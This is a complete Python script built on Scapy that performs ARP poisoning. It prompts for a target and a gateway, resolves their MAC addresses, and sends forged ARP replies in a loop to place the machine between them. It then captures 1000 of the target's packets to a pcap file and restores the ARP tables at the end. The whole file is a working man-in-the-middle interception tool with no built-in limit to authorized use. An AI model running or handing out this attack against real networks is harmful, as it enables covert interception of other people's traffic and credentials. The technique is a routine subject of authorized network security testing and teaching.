from scapy.all import ARP, Ether, send, srp, sniff, wrpcap, conf, get_if_list
import os
import sys
import threading
import signal
import time
import ipaddress

# Show available interfaces
print("Available network interfaces:")
for iface in get_if_list():
    print(f" - {iface}")

interface = input("Enter your network interface: ").strip()
if interface not in get_if_list():
    print(f"[!] Invalid interface '{interface}'. Exiting.")
    sys.exit(1)

def valid_ip(ip_str):
    try:
        ipaddress.ip_address(ip_str)
        return True
    except ValueError:
        return False

target_ip = input("Enter target IP: ").strip()
gateway_ip = input("Enter gateway IP: ").strip()
output_file = input("Enter output filename (.pcap): ").strip() or "arp_test.pcap"
packet_count = 1000

if not (valid_ip(target_ip) and valid_ip(gateway_ip)):
    print("[!] One or more IP addresses are invalid. Exiting.")
    sys.exit(1)


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Restoring network ARP tables...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
    os.kill(os.getpid(), signal.SIGINT)

def get_mac(ip_address):
    print(f"[*] Resolving MAC for {ip_address}...")
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),
                                timeout=2, retry=10, verbose=0)
    for s, r in responses:
        return r[Ether].src
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    poison_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

    print("[*] Beginning ARP poison. [CTRL+C to stop]")

    try:
        while True:
            send(poison_target, count=5, verbose=0)
            send(poison_gateway, count=5, verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        pass

    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    print("[*] ARP poison finished.")



conf.iface = interface
conf.verb = 0

print(f"[*] Using interface: {interface}")

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] Failed to retrieve gateway MAC address. Exiting.")
    sys.exit(1)
print(f"[*] Gateway {gateway_ip} is at {gateway_mac}")

target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!] Failed to retrieve target MAC address. Exiting.")
    sys.exit(1)
print(f"[*] Target {target_ip} is at {target_mac}")

# Start poisoning in a separate thread
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print(f"[*] Sniffing {packet_count} packets from {target_ip}...")
    bpf_filter = f"ip host {target_ip}"
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

    print(f"[*] Writing packets to {output_file}...")
    wrpcap(output_file, packets)

    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

except KeyboardInterrupt:
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
